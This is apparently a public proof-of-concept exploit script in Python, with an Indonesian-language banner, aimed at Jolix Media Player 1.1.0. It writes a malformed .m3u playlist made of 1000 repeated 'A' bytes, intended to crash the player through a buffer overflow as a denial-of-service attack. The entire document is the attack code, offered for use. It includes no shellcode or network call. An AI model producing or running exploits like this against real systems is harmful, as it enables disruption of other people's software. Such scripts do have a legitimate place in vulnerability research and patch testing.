#!/usr/bin/python
print """
 [+]Judul Ledakan:Jolix Media Player (.m3u) Denial of Service Exploit
 [+]Celah versi: Version 1.1.0
 [+]Mengunduh produk: http://www.jolixtools.com/downloads/jolix-media-player-setup.exe
 [+]Hari Tanggal Tahun: 09.07.2013
 [+]Penulis: IndonesiaGokilTeam
 [+]Dicoba di sistem operasi: Windows xp sp 3
 """
 
sampah = "\x41" * 1000
ledakan = sampah
   
try:
    rst= open("SampahMasyarakat.m3u",'w')
    rst.write(ledakan)
    rst.close()
    print("\nFile Sampah Masyarakat dibuat !\n")
except:
    print "Gagal"
